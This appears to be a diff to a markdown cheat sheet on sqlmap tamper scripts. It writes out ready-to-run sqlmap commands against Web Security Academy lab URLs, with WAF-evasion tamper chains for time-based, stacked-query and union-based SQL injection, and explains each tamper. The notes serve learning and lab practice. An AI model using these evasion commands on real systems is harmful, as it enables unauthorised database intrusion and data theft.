@@ -79,10 +79,10 @@
 
 sqlmap -u 'https://0a0e00e00384b00d8019766c000600fd.web-security-academy.net/filter?category=Gifts' -p category --tamper=randomcase,sleep2getlock,space2dash,charencode --technique=T
 
-1. Replace SLEEP with GET_LOCK
-2. Replace spaces ' ' with '--abcd%0A'
-3. Random Character Case on SQL Keywords
-4. URL Encode all Characters
+1. sleep2getlock - Replace SLEEP with GET_LOCK
+2. space2dash - Replace spaces ' ' with '--abcd%0A'
+3. randomcase - Random Character Case on SQL Keywords
+4. charencode - URL Encode all Characters
 
 SEE IMAGE BELOW TO SEE WHAT THIS TAMPER LOOKS LIKE IN BURPSUITE
 
@@ -95,14 +95,26 @@ SEE IMAGE BELOW TO SEE WHAT THIS TAMPER LOOKS LIKE IN BURPSUITE
 
 sqlmap -u 'https://0a0000e504c29d92807017d700e60008.web-security-academy.net/filter?category=Gifts' -p category --tamper=randomcase,sleep2getlock,space2dash,charencode --technique=S
 
-1. Replace SLEEP with GET_LOCK
-2. Replace spaces ' ' with '--abcd%0A'
-3. Random Character Case on SQL Keywords
-4. URL Encode all Characters
+1. sleep2getlock - Replace SLEEP with GET_LOCK
+2. space2dash - Replace spaces ' ' with '--abcd%0A'
+3. randomcase - Random Character Case on SQL Keywords
+4. charencode - URL Encode all Characters
 
 SEE IMAGE BELOW TO SEE WHAT THIS TAMPER LOOKS LIKE IN BURPSUITE
 
 <img width="1910" height="333" alt="tamper-script-stackedquery-sleep2lock-and-space2dash" src="https://github.com/user-attachments/assets/0a35b7b0-472e-4ca3-9c25-2718768702a5" />
 
+<h2>Union-Based Tamper Scripts</h2>
+<h3><mark>--tamper=unmagicquotes,multiplespaces,space2dash --technique=U</mark></h3>
+
+sqlmap -u 'https://0ada00ce0368431c9c91cb8500f800c7.web-security-academy.net/filter?category=Lifestyle' -p category --tamper=unmagicquotes,multiplespaces,space2dash --technique=U
+
+1. unmagicquotes - Replaces quote character (') with a multi-byte combo %BF%27 together with generic comment at the end (to make it work)
+2. multiplespaces - Adds multiple spaces (' ') around SQL keywords
+3. space2dash - Replace spaces ' ' with '--abcd%0A'
+
+SEE IMAGE BELOW TO SEE WHAT THIS TAMPER LOOKS LIKE IN BURPSUITE
+
+<img width="1909" height="324" alt="tamper-script-unionbased-unmagicquotes-multiplespaces-space2dash" src="https://github.com/user-attachments/assets/db24309b-30fb-47f3-a1b3-7e0acc919e2a" />
 
 <h1>TO BE CONTINUED</h1>
